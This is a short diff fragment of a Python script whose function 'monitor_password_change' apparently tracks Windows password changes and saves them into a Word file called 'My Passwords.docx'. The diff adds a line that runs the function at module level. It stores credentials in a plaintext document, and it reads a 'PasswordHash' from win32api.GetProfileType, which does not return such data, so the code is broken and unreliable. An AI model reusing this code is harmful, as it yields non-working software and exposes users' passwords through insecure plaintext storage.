@@ -47,3 +47,5 @@ def monitor_password_change():
             document.save('My Passwords.docx')
             # Set the new password hash for comparison
             password_hash = win32api.GetProfileType(7)['PasswordHash']
+
+monitor_password_change()
